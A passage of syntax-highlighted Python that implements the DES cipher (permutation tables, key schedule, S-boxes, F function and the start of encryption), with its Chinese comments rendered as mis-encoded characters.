class="hljs-number">40</span>,                 <span class="hljs-number">51</span>,<span class="hljs-number">45</span>,<span class="hljs-number">33</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">39</span>,<span class="hljs-number">56</span>,                 <span class="hljs-number">34</span>,<span class="hljs-number">53</span>,<span class="hljs-number">46</span>,<span class="hljs-number">42</span>,<span class="hljs-number">50</span>,<span class="hljs-number">36</span>,<span class="hljs-number">29</span>,<span class="hljs-number">32</span>]    res = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># å¾ªç¯å·¦ç§»</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">left_run</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, num</span>):</span>    tmp_str = <span class="hljs-built_in">str</span>[num:<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)]    tmp_str = tmp_str+<span class="hljs-built_in">str</span>[<span class="hljs-number">0</span>:num]    <span class="hljs-keyword">return</span> tmp_str<span class="hljs-comment"># ç”Ÿæˆ16ä¸ªå­å¯†é’¥</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_gen</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>    key_list = []    key_change_res = key_change_1(<span class="hljs-built_in">str</span>)    key_c = key_change_res[<span class="hljs-number">0</span>:<span class="hljs-number">28</span>]    key_d = key_change_res[<span class="hljs-number">28</span>:]    num = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">17</span>): <span class="hljs-comment">#å…±16è½®</span>        key_c = left_run(key_c, num[i])        key_d = left_run(key_d, num[i])        key_yiwei = key_c + key_d        key_res = key_change_2(key_yiwei)        key_list.append(key_res)    <span class="hljs-keyword">return</span> key_list<span class="hljs-comment"># IPç›’å¤„ç†</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">begin_change</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>    change_table = [<span class="hljs-number">58</span>,<span class="hljs-number">50</span>,<span class="hljs-number">42</span>,<span class="hljs-number">34</span>,<span class="hljs-number">26</span>,<span class="hljs-number">18</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,                   <span class="hljs-number">60</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">28</span>,<span class="hljs-number">20</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,                   <span class="hljs-number">62</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,<span class="hljs-number">38</span>,<span class="hljs-number">30</span>,<span class="hljs-number">22</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,                   <span class="hljs-number">64</span>,<span class="hljs-number">56</span>,<span class="hljs-number">48</span>,<span class="hljs-number">40</span>,<span class="hljs-number">32</span>,<span class="hljs-number">24</span>,<span class="hljs-number">16</span>,<span class="hljs-number">8</span>,                   <span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,                   <span class="hljs-number">59</span>,<span class="hljs-number">51</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">27</span>,<span class="hljs-number">19</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,                   <span class="hljs-number">61</span>,<span class="hljs-number">53</span>,<span class="hljs-number">45</span>,<span class="hljs-number">37</span>,<span class="hljs-number">29</span>,<span class="hljs-number">21</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,                   <span class="hljs-number">63</span>,<span class="hljs-number">55</span>,<span class="hljs-number">47</span>,<span class="hljs-number">39</span>,<span class="hljs-number">31</span>,<span class="hljs-number">23</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>]    res = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># Eç›’å¤„ç†  32ä½-&gt;48ä½</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">E_box</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>    change_table = [<span class="hljs-number">32</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,                    <span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,                    <span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,                    <span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,                    <span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span>,<span class="hljs-number">27</span>,                    <span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">31</span>,<span class="hljs-number">32</span>,<span class="hljs-number">1</span>]    res = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># sç›’å¤„ç†   48ä½-&gt;32ä½</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">S_box</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>    j = <span class="hljs-number">0</span>    s_list = [[<span class="hljs-number">14</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">13</span>],              [<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">15</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>],              [<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>],              [<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>],              [<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>],              [<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">15</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">14</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>],              [<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">14</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>],              [<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>]              ]    res = <span class="hljs-string">&quot;&quot;</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>), <span class="hljs-number">6</span>):        begin_s = <span class="hljs-built_in">str</span>[i:i + <span class="hljs-number">6</span>]        row = <span class="hljs-built_in">int</span>(begin_s[<span class="hljs-number">0</span>] + begin_s[<span class="hljs-number">5</span>], <span class="hljs-number">2</span>)  <span class="hljs-comment">#ç¬¬ä¸€ä½å’Œç¬¬å…­ä½ä½œä¸ºè¡Œ</span>        col = <span class="hljs-built_in">int</span>(begin_s[<span class="hljs-number">1</span>:<span class="hljs-number">5</span>], <span class="hljs-number">2</span>)             <span class="hljs-comment">#ä¸­é—´å››ä½ä½œä¸ºåˆ—</span>        index = s_list[j][row * <span class="hljs-number">16</span> + col]        num = <span class="hljs-built_in">bin</span>(index)[<span class="hljs-number">2</span>:]                   <span class="hljs-comment">#å°†åŒ¹é…çš„æ•°å­—è½¬æ¢ä½äºŒè¿›åˆ¶æ•°</span>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span> - <span class="hljs-built_in">len</span>(num)):       <span class="hljs-comment">#ä¸å¤Ÿ4ä½åˆ™è¡¥0</span>            num = <span class="hljs-string">&quot;0&quot;</span> + num        res += num        j = j + <span class="hljs-number">1</span>    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># pç›’å¤„ç†   ç½®æ¢æ“ä½œ</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">P_box</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>    res = <span class="hljs-string">&quot;&quot;</span>    change_table = [<span class="hljs-number">16</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">29</span>,<span class="hljs-number">12</span>,<span class="hljs-number">28</span>,<span class="hljs-number">17</span>,                    <span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">23</span>,<span class="hljs-number">26</span>,<span class="hljs-number">5</span>,<span class="hljs-number">18</span>,<span class="hljs-number">31</span>,<span class="hljs-number">10</span>,                    <span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">24</span>,<span class="hljs-number">14</span>,<span class="hljs-number">32</span>,<span class="hljs-number">27</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,                    <span class="hljs-number">19</span>,<span class="hljs-number">13</span>,<span class="hljs-number">30</span>,<span class="hljs-number">6</span>,<span class="hljs-number">22</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">25</span>]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:        res += <span class="hljs-built_in">str</span>[i - <span class="hljs-number">1</span>]    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># Få‡½æ•°</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F_function</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, key</span>):</span>  <span class="hljs-comment"># R(32ä½)-&gt;Eç›’(48ä½)-&gt;ä¸keyçš„å­å¯†é’¥å¼‚æˆ–-&gt;Sç›’-&gt;Pç½®æ¢</span>    str_e_res = E_box(<span class="hljs-built_in">str</span>)            <span class="hljs-comment"># å°† E å¼‚æˆ– S  P é›†åˆåˆ°ä¸€ä¸ªå‡½æ•°ç§ï¼Œä¾¿äºè°ƒç”¨</span>    xor_res = xor(str_e_res, key)    str_s_res = S_box(xor_res)    str_p_res = P_box(str_s_res)    <span class="hljs-keyword">return</span> str_p_res<span class="hljs-comment"># é€†IPç›’</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">IP_re</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>    res = <span class="hljs-string">&quot;&quot;</span>    ip_list = [<span class="hljs-number">40</span>,<span class="hljs-number">8</span>,<span class="hljs-number">48</span>,<span class="hljs-number">16</span>,<span class="hljs-number">56</span>,<span class="hljs-number">24</span>,<span class="hljs-number">64</span>,<span class="hljs-number">32</span>,               <span class="hljs-number">39</span>,<span class="hljs-number">7</span>,<span class="hljs-number">47</span>,<span class="hljs-number">15</span>,<span class="hljs-number">55</span>,<span class="hljs-number">23</span>,<span class="hljs-number">63</span>,<span class="hljs-number">31</span>,               <span class="hljs-number">38</span>,<span class="hljs-number">6</span>,<span class="hljs-number">46</span>,<span class="hljs-number">14</span>,<span class="hljs-number">54</span>,<span class="hljs-number">22</span>,<span class="hljs-number">62</span>,<span class="hljs-number">30</span>,               <span class="hljs-number">37</span>,<span class="hljs-number">5</span>,<span class="hljs-number">45</span>,<span class="hljs-number">13</span>,<span class="hljs-number">53</span>,<span class="hljs-number">21</span>,<span class="hljs-number">61</span>,<span class="hljs-number">29</span>,               <span class="hljs-number">36</span>,<span class="hljs-number">4</span>,<span class="hljs-number">44</span>,<span class="hljs-number">12</span>,<span class="hljs-number">52</span>,<span class="hljs-number">20</span>,<span class="hljs-number">60</span>,<span class="hljs-number">28</span>,               <span class="hljs-number">35</span>,<span class="hljs-number">3</span>,<span class="hljs-number">43</span>,<span class="hljs-number">11</span>,<span class="hljs-number">51</span>,<span class="hljs-number">19</span>,<span class="hljs-number">59</span>,<span class="hljs-number">27</span>,               <span class="hljs-number">34</span>,<span class="hljs-number">2</span>,<span class="hljs-number">42</span>,<span class="hljs-number">10</span>,<span class="hljs-number">50</span>,<span class="hljs-number">18</span>,<span class="hljs-number">58</span>,<span class="hljs-number">26</span>,               <span class="hljs-number">33</span>,<span class="hljs-number">1</span>,<span class="hljs-number">41</span>,<span class="hljs-number">9</span>,<span class="hljs-number">49</span>,<span class="hljs-number">17</span>,<span class="hljs-number">57</span>,<span class="hljs-number">25</span> ]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ip_list:        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># DESåŠ å¯†æ“ä½œ</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DESencode</span>(<span class="hljs-params">text, key</span>):</span>    text_bin = str_process(text)     <span class="hljs-comment"># å°†å­—ç¬¦è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°</span>    text_IP = begin_change(text_bin)  <span class="hljs-comment"># æ˜æ–‡åˆå§‹ç½®æ¢</span>    key_bin = str_process(key)      <span class="hljs-comment"># å°†å¯†é’¥è½¬æ¢ä½äºŒè¿›åˆ¶æ•°</span>    key_list = key_gen(key_bin) <span class="hljs-comment"># key_lsst æ•°ç»„ä¸­å­˜æ”¾ç€åå…­ä¸ªå­å¯†é’¥</span>    text_left = text_IP[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>]     <span class="hljs-comment"># R0</span>    text_right = text_IP[<span class="hljs-number">32</span>:]     <span class="hljs-comment"># L0</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>):      <span class="hljs-comment"># åäº”è½®åŠ å¯†</span>        mes_tmp = text_right     <span class="hljs-comment"># 